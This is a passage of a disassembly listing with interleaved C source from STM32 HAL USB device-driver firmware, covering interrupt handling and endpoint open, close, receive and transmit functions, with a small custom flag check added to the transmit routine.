 8001fe4:	68fb      	ldr	r3, [r7, #12]
 8001fe6:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8001fea:	2b00      	cmp	r3, #0
 8001fec:	d027      	beq.n	800203e <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001fee:	687b      	ldr	r3, [r7, #4]
 8001ff0:	681b      	ldr	r3, [r3, #0]
 8001ff2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001ff6:	b29a      	uxth	r2, r3
 8001ff8:	687b      	ldr	r3, [r7, #4]
 8001ffa:	681b      	ldr	r3, [r3, #0]
 8001ffc:	f042 0208 	orr.w	r2, r2, #8
 8002000:	b292      	uxth	r2, r2
 8002002:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8002006:	687b      	ldr	r3, [r7, #4]
 8002008:	681b      	ldr	r3, [r3, #0]
 800200a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800200e:	b29a      	uxth	r2, r3
 8002010:	687b      	ldr	r3, [r7, #4]
 8002012:	681b      	ldr	r3, [r3, #0]
 8002014:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8002018:	b292      	uxth	r2, r2
 800201a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 800201e:	687b      	ldr	r3, [r7, #4]
 8002020:	681b      	ldr	r3, [r3, #0]
 8002022:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002026:	b29a      	uxth	r2, r3
 8002028:	687b      	ldr	r3, [r7, #4]
 800202a:	681b      	ldr	r3, [r3, #0]
 800202c:	f042 0204 	orr.w	r2, r2, #4
 8002030:	b292      	uxth	r2, r2
 8002032:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8002036:	6878      	ldr	r0, [r7, #4]
 8002038:	f00a fcdc 	bl	800c9f4 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 800203c:	e06c      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 800203e:	68fb      	ldr	r3, [r7, #12]
 8002040:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002044:	2b00      	cmp	r3, #0
 8002046:	d040      	beq.n	80020ca <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8002048:	687b      	ldr	r3, [r7, #4]
 800204a:	681b      	ldr	r3, [r3, #0]
 800204c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002050:	b29a      	uxth	r2, r3
 8002052:	687b      	ldr	r3, [r7, #4]
 8002054:	681b      	ldr	r3, [r3, #0]
 8002056:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 800205a:	b292      	uxth	r2, r2
 800205c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8002060:	687b      	ldr	r3, [r7, #4]
 8002062:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002066:	2b00      	cmp	r3, #0
 8002068:	d12b      	bne.n	80020c2 <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 800206a:	687b      	ldr	r3, [r7, #4]
 800206c:	681b      	ldr	r3, [r3, #0]
 800206e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002072:	b29a      	uxth	r2, r3
 8002074:	687b      	ldr	r3, [r7, #4]
 8002076:	681b      	ldr	r3, [r3, #0]
 8002078:	f042 0204 	orr.w	r2, r2, #4
 800207c:	b292      	uxth	r2, r2
 800207e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8002082:	687b      	ldr	r3, [r7, #4]
 8002084:	681b      	ldr	r3, [r3, #0]
 8002086:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800208a:	b29a      	uxth	r2, r3
 800208c:	687b      	ldr	r3, [r7, #4]
 800208e:	681b      	ldr	r3, [r3, #0]
 8002090:	f042 0208 	orr.w	r2, r2, #8
 8002094:	b292      	uxth	r2, r2
 8002096:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 800209a:	687b      	ldr	r3, [r7, #4]
 800209c:	2201      	movs	r2, #1
 800209e:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 80020a2:	687b      	ldr	r3, [r7, #4]
 80020a4:	681b      	ldr	r3, [r3, #0]
 80020a6:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80020aa:	b29b      	uxth	r3, r3
 80020ac:	089b      	lsrs	r3, r3, #2
 80020ae:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 80020b2:	687b      	ldr	r3, [r7, #4]
 80020b4:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 80020b8:	2101      	movs	r1, #1
 80020ba:	6878      	ldr	r0, [r7, #4]
 80020bc:	f00a ff58 	bl	800cf70 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 80020c0:	e02a      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 80020c2:	6878      	ldr	r0, [r7, #4]
 80020c4:	f00a fc96 	bl	800c9f4 <HAL_PCD_SuspendCallback>
    return;
 80020c8:	e026      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 80020ca:	68fb      	ldr	r3, [r7, #12]
 80020cc:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80020d0:	2b00      	cmp	r3, #0
 80020d2:	d00f      	beq.n	80020f4 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 80020d4:	687b      	ldr	r3, [r7, #4]
 80020d6:	681b      	ldr	r3, [r3, #0]
 80020d8:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020dc:	b29a      	uxth	r2, r3
 80020de:	687b      	ldr	r3, [r7, #4]
 80020e0:	681b      	ldr	r3, [r3, #0]
 80020e2:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 80020e6:	b292      	uxth	r2, r2
 80020e8:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 80020ec:	6878      	ldr	r0, [r7, #4]
 80020ee:	f00a fc54 	bl	800c99a <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 80020f2:	e011      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 80020f4:	68fb      	ldr	r3, [r7, #12]
 80020f6:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80020fa:	2b00      	cmp	r3, #0
 80020fc:	d00c      	beq.n	8002118 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 80020fe:	687b      	ldr	r3, [r7, #4]
 8002100:	681b      	ldr	r3, [r3, #0]
 8002102:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002106:	b29a      	uxth	r2, r3
 8002108:	687b      	ldr	r3, [r7, #4]
 800210a:	681b      	ldr	r3, [r3, #0]
 800210c:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8002110:	b292      	uxth	r2, r2
 8002112:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002116:	bf00      	nop
  }
}
 8002118:	3710      	adds	r7, #16
 800211a:	46bd      	mov	sp, r7
 800211c:	bd80      	pop	{r7, pc}

0800211e <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 800211e:	b580      	push	{r7, lr}
 8002120:	b082      	sub	sp, #8
 8002122:	af00      	add	r7, sp, #0
 8002124:	6078      	str	r0, [r7, #4]
 8002126:	460b      	mov	r3, r1
 8002128:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 800212a:	687b      	ldr	r3, [r7, #4]
 800212c:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002130:	2b01      	cmp	r3, #1
 8002132:	d101      	bne.n	8002138 <HAL_PCD_SetAddress+0x1a>
 8002134:	2302      	movs	r3, #2
 8002136:	e013      	b.n	8002160 <HAL_PCD_SetAddress+0x42>
 8002138:	687b      	ldr	r3, [r7, #4]
 800213a:	2201      	movs	r2, #1
 800213c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 8002140:	687b      	ldr	r3, [r7, #4]
 8002142:	78fa      	ldrb	r2, [r7, #3]
 8002144:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 8002148:	687b      	ldr	r3, [r7, #4]
 800214a:	681b      	ldr	r3, [r3, #0]
 800214c:	78fa      	ldrb	r2, [r7, #3]
 800214e:	4611      	mov	r1, r2
 8002150:	4618      	mov	r0, r3
 8002152:	f006 f94a 	bl	80083ea <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 8002156:	687b      	ldr	r3, [r7, #4]
 8002158:	2200      	movs	r2, #0
 800215a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800215e:	2300      	movs	r3, #0
}
 8002160:	4618      	mov	r0, r3
 8002162:	3708      	adds	r7, #8
 8002164:	46bd      	mov	sp, r7
 8002166:	bd80      	pop	{r7, pc}

08002168 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 8002168:	b580      	push	{r7, lr}
 800216a:	b084      	sub	sp, #16
 800216c:	af00      	add	r7, sp, #0
 800216e:	6078      	str	r0, [r7, #4]
 8002170:	4608      	mov	r0, r1
 8002172:	4611      	mov	r1, r2
 8002174:	461a      	mov	r2, r3
 8002176:	4603      	mov	r3, r0
 8002178:	70fb      	strb	r3, [r7, #3]
 800217a:	460b      	mov	r3, r1
 800217c:	803b      	strh	r3, [r7, #0]
 800217e:	4613      	mov	r3, r2
 8002180:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 8002182:	2300      	movs	r3, #0
 8002184:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002186:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800218a:	2b00      	cmp	r3, #0
 800218c:	da0e      	bge.n	80021ac <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800218e:	78fb      	ldrb	r3, [r7, #3]
 8002190:	f003 0307 	and.w	r3, r3, #7
 8002194:	1c5a      	adds	r2, r3, #1
 8002196:	4613      	mov	r3, r2
 8002198:	009b      	lsls	r3, r3, #2
 800219a:	4413      	add	r3, r2
 800219c:	00db      	lsls	r3, r3, #3
 800219e:	687a      	ldr	r2, [r7, #4]
 80021a0:	4413      	add	r3, r2
 80021a2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80021a4:	68fb      	ldr	r3, [r7, #12]
 80021a6:	2201      	movs	r2, #1
 80021a8:	705a      	strb	r2, [r3, #1]
 80021aa:	e00e      	b.n	80021ca <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80021ac:	78fb      	ldrb	r3, [r7, #3]
 80021ae:	f003 0207 	and.w	r2, r3, #7
 80021b2:	4613      	mov	r3, r2
 80021b4:	009b      	lsls	r3, r3, #2
 80021b6:	4413      	add	r3, r2
 80021b8:	00db      	lsls	r3, r3, #3
 80021ba:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80021be:	687a      	ldr	r2, [r7, #4]
 80021c0:	4413      	add	r3, r2
 80021c2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80021c4:	68fb      	ldr	r3, [r7, #12]
 80021c6:	2200      	movs	r2, #0
 80021c8:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 80021ca:	78fb      	ldrb	r3, [r7, #3]
 80021cc:	f003 0307 	and.w	r3, r3, #7
 80021d0:	b2da      	uxtb	r2, r3
 80021d2:	68fb      	ldr	r3, [r7, #12]
 80021d4:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 80021d6:	883a      	ldrh	r2, [r7, #0]
 80021d8:	68fb      	ldr	r3, [r7, #12]
 80021da:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 80021dc:	68fb      	ldr	r3, [r7, #12]
 80021de:	78ba      	ldrb	r2, [r7, #2]
 80021e0:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 80021e2:	78bb      	ldrb	r3, [r7, #2]
 80021e4:	2b02      	cmp	r3, #2
 80021e6:	d102      	bne.n	80021ee <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 80021e8:	68fb      	ldr	r3, [r7, #12]
 80021ea:	2200      	movs	r2, #0
 80021ec:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 80021ee:	687b      	ldr	r3, [r7, #4]
 80021f0:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80021f4:	2b01      	cmp	r3, #1
 80021f6:	d101      	bne.n	80021fc <HAL_PCD_EP_Open+0x94>
 80021f8:	2302      	movs	r3, #2
 80021fa:	e00e      	b.n	800221a <HAL_PCD_EP_Open+0xb2>
 80021fc:	687b      	ldr	r3, [r7, #4]
 80021fe:	2201      	movs	r2, #1
 8002200:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 8002204:	687b      	ldr	r3, [r7, #4]
 8002206:	681b      	ldr	r3, [r3, #0]
 8002208:	68f9      	ldr	r1, [r7, #12]
 800220a:	4618      	mov	r0, r3
 800220c:	f003 fe8c 	bl	8005f28 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002210:	687b      	ldr	r3, [r7, #4]
 8002212:	2200      	movs	r2, #0
 8002214:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 8002218:	7afb      	ldrb	r3, [r7, #11]
}
 800221a:	4618      	mov	r0, r3
 800221c:	3710      	adds	r7, #16
 800221e:	46bd      	mov	sp, r7
 8002220:	bd80      	pop	{r7, pc}

08002222 <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002222:	b580      	push	{r7, lr}
 8002224:	b084      	sub	sp, #16
 8002226:	af00      	add	r7, sp, #0
 8002228:	6078      	str	r0, [r7, #4]
 800222a:	460b      	mov	r3, r1
 800222c:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 800222e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002232:	2b00      	cmp	r3, #0
 8002234:	da0e      	bge.n	8002254 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002236:	78fb      	ldrb	r3, [r7, #3]
 8002238:	f003 0307 	and.w	r3, r3, #7
 800223c:	1c5a      	adds	r2, r3, #1
 800223e:	4613      	mov	r3, r2
 8002240:	009b      	lsls	r3, r3, #2
 8002242:	4413      	add	r3, r2
 8002244:	00db      	lsls	r3, r3, #3
 8002246:	687a      	ldr	r2, [r7, #4]
 8002248:	4413      	add	r3, r2
 800224a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 800224c:	68fb      	ldr	r3, [r7, #12]
 800224e:	2201      	movs	r2, #1
 8002250:	705a      	strb	r2, [r3, #1]
 8002252:	e00e      	b.n	8002272 <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002254:	78fb      	ldrb	r3, [r7, #3]
 8002256:	f003 0207 	and.w	r2, r3, #7
 800225a:	4613      	mov	r3, r2
 800225c:	009b      	lsls	r3, r3, #2
 800225e:	4413      	add	r3, r2
 8002260:	00db      	lsls	r3, r3, #3
 8002262:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002266:	687a      	ldr	r2, [r7, #4]
 8002268:	4413      	add	r3, r2
 800226a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800226c:	68fb      	ldr	r3, [r7, #12]
 800226e:	2200      	movs	r2, #0
 8002270:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 8002272:	78fb      	ldrb	r3, [r7, #3]
 8002274:	f003 0307 	and.w	r3, r3, #7
 8002278:	b2da      	uxtb	r2, r3
 800227a:	68fb      	ldr	r3, [r7, #12]
 800227c:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800227e:	687b      	ldr	r3, [r7, #4]
 8002280:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002284:	2b01      	cmp	r3, #1
 8002286:	d101      	bne.n	800228c <HAL_PCD_EP_Close+0x6a>
 8002288:	2302      	movs	r3, #2
 800228a:	e00e      	b.n	80022aa <HAL_PCD_EP_Close+0x88>
 800228c:	687b      	ldr	r3, [r7, #4]
 800228e:	2201      	movs	r2, #1
 8002290:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 8002294:	687b      	ldr	r3, [r7, #4]
 8002296:	681b      	ldr	r3, [r3, #0]
 8002298:	68f9      	ldr	r1, [r7, #12]
 800229a:	4618      	mov	r0, r3
 800229c:	f004 fa08 	bl	80066b0 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 80022a0:	687b      	ldr	r3, [r7, #4]
 80022a2:	2200      	movs	r2, #0
 80022a4:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 80022a8:	2300      	movs	r3, #0
}
 80022aa:	4618      	mov	r0, r3
 80022ac:	3710      	adds	r7, #16
 80022ae:	46bd      	mov	sp, r7
 80022b0:	bd80      	pop	{r7, pc}

080022b2 <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80022b2:	b580      	push	{r7, lr}
 80022b4:	b086      	sub	sp, #24
 80022b6:	af00      	add	r7, sp, #0
 80022b8:	60f8      	str	r0, [r7, #12]
 80022ba:	607a      	str	r2, [r7, #4]
 80022bc:	603b      	str	r3, [r7, #0]
 80022be:	460b      	mov	r3, r1
 80022c0:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80022c2:	7afb      	ldrb	r3, [r7, #11]
 80022c4:	f003 0207 	and.w	r2, r3, #7
 80022c8:	4613      	mov	r3, r2
 80022ca:	009b      	lsls	r3, r3, #2
 80022cc:	4413      	add	r3, r2
 80022ce:	00db      	lsls	r3, r3, #3
 80022d0:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80022d4:	68fa      	ldr	r2, [r7, #12]
 80022d6:	4413      	add	r3, r2
 80022d8:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80022da:	697b      	ldr	r3, [r7, #20]
 80022dc:	687a      	ldr	r2, [r7, #4]
 80022de:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80022e0:	697b      	ldr	r3, [r7, #20]
 80022e2:	683a      	ldr	r2, [r7, #0]
 80022e4:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 80022e6:	697b      	ldr	r3, [r7, #20]
 80022e8:	2200      	movs	r2, #0
 80022ea:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 80022ec:	697b      	ldr	r3, [r7, #20]
 80022ee:	2200      	movs	r2, #0
 80022f0:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 80022f2:	7afb      	ldrb	r3, [r7, #11]
 80022f4:	f003 0307 	and.w	r3, r3, #7
 80022f8:	b2da      	uxtb	r2, r3
 80022fa:	697b      	ldr	r3, [r7, #20]
 80022fc:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 80022fe:	68fb      	ldr	r3, [r7, #12]
 8002300:	681b      	ldr	r3, [r3, #0]
 8002302:	6979      	ldr	r1, [r7, #20]
 8002304:	4618      	mov	r0, r3
 8002306:	f004 fbc0 	bl	8006a8a <USB_EPStartXfer>

  return HAL_OK;
 800230a:	2300      	movs	r3, #0
}
 800230c:	4618      	mov	r0, r3
 800230e:	3718      	adds	r7, #24
 8002310:	46bd      	mov	sp, r7
 8002312:	bd80      	pop	{r7, pc}

08002314 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 8002314:	b480      	push	{r7}
 8002316:	b083      	sub	sp, #12
 8002318:	af00      	add	r7, sp, #0
 800231a:	6078      	str	r0, [r7, #4]
 800231c:	460b      	mov	r3, r1
 800231e:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 8002320:	78fb      	ldrb	r3, [r7, #3]
 8002322:	f003 0207 	and.w	r2, r3, #7
 8002326:	6879      	ldr	r1, [r7, #4]
 8002328:	4613      	mov	r3, r2
 800232a:	009b      	lsls	r3, r3, #2
 800232c:	4413      	add	r3, r2
 800232e:	00db      	lsls	r3, r3, #3
 8002330:	440b      	add	r3, r1
 8002332:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 8002336:	681b      	ldr	r3, [r3, #0]
}
 8002338:	4618      	mov	r0, r3
 800233a:	370c      	adds	r7, #12
 800233c:	46bd      	mov	sp, r7
 800233e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002342:	4770      	bx	lr

08002344 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002344:	b580      	push	{r7, lr}
 8002346:	b086      	sub	sp, #24
 8002348:	af00      	add	r7, sp, #0
 800234a:	60f8      	str	r0, [r7, #12]
 800234c:	607a      	str	r2, [r7, #4]
 800234e:	603b      	str	r3, [r7, #0]
 8002350:	460b      	mov	r3, r1
 8002352:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002354:	7afb      	ldrb	r3, [r7, #11]
 8002356:	f003 0307 	and.w	r3, r3, #7
 800235a:	1c5a      	adds	r2, r3, #1
 800235c:	4613      	mov	r3, r2
 800235e:	009b      	lsls	r3, r3, #2
 8002360:	4413      	add	r3, r2
 8002362:	00db      	lsls	r3, r3, #3
 8002364:	68fa      	ldr	r2, [r7, #12]
 8002366:	4413      	add	r3, r2
 8002368:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800236a:	697b      	ldr	r3, [r7, #20]
 800236c:	687a      	ldr	r2, [r7, #4]
 800236e:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002370:	697b      	ldr	r3, [r7, #20]
 8002372:	683a      	ldr	r2, [r7, #0]
 8002374:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 8002376:	697b      	ldr	r3, [r7, #20]
 8002378:	2201      	movs	r2, #1
 800237a:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 800237e:	697b      	ldr	r3, [r7, #20]
 8002380:	683a      	ldr	r2, [r7, #0]
 8002382:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 8002384:	697b      	ldr	r3, [r7, #20]
 8002386:	2200      	movs	r2, #0
 8002388:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 800238a:	697b      	ldr	r3, [r7, #20]
 800238c:	2201      	movs	r2, #1
 800238e:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002390:	7afb      	ldrb	r3, [r7, #11]
 8002392:	f003 0307 	and.w	r3, r3, #7
 8002396:	b2da      	uxtb	r2, r3
 8002398:	697b      	ldr	r3, [r7, #20]
 800239a:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 800239c:	4b0e      	ldr	r3, [pc, #56]	; (80023d8 <HAL_PCD_EP_Transmit+0x94>)
 800239e:	781b      	ldrb	r3, [r3, #0]
 80023a0:	f003 0302 	and.w	r3, r3, #2
 80023a4:	2b00      	cmp	r3, #0
 80023a6:	d102      	bne.n	80023ae <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 80023a8:	4b0c      	ldr	r3, [pc, #48]	; (80023dc <HAL_PCD_EP_Transmit+0x98>)
 80023aa:	2201      	movs	r2, #1
 80023ac:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 80023ae:	68fb      	ldr	r3, [r7, #12]
 80023b0:	681b      	ldr	r3, [r3, #0]
 80023b2:	6979      	ldr	r1, [r7, #20]
 80023b4:	4618      	mov	r0, r3
 80023b6:	f004 fb68 	bl	8006a8a <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 80023ba:	4b07      	ldr	r3, [pc, #28]	; (80023d8 <HAL_PCD_EP_Transmit+0x94>)
 80023bc:	781b      	ldrb	r3, [r3, #0]
 80023be:	f003 0302 	and.w	r3, r3, #2
 80023c2:	2b00      	cmp	r3, #0
 80023c4:	d102      	bne.n	80023cc <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 80023c6:	4b06      	ldr	r3, [pc, #24]	; (80023e0 <HAL_PCD_EP_Transmit+0x9c>)
 80023c8:	2201      	movs	r2, #1
 80023ca:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 80023cc:	2300      	movs	r3, #0
}
 80023ce:	4618      	mov	r0, r3
 80023d0:	3718      	adds	r7, #24
 80023d2:	46bd      	mov	sp, r7
 80023d4:	bd80      	pop	{r7, pc}
 80023d6:	bf00      	nop
 80023d8:	2000026c 	.word	0x2000026c
 80023dc:	20000270 	.word	0x20000270
 80023e0:	2000027c 	.word	0x2000027c

080023e4 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80023e4:	b580      	push	{r7, lr}
 80023e6:	b084      	sub	sp, #16
 80023e8:	af00      	add	r7, sp, #0
 80023ea:	6078      	str	r0, [r7, #4]
 80023ec:	460b      	mov	r3, r1
 80023ee:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 80023f0:	78fb      	ldrb	r3, [r7, #3]
 80023f2:	f003 0207 	and.w	r2, r3, #7
 80023f6:	687b      	ldr	r3, [r7, #4]
 80023f8:	685b      	ldr	r3, [r3, #4]
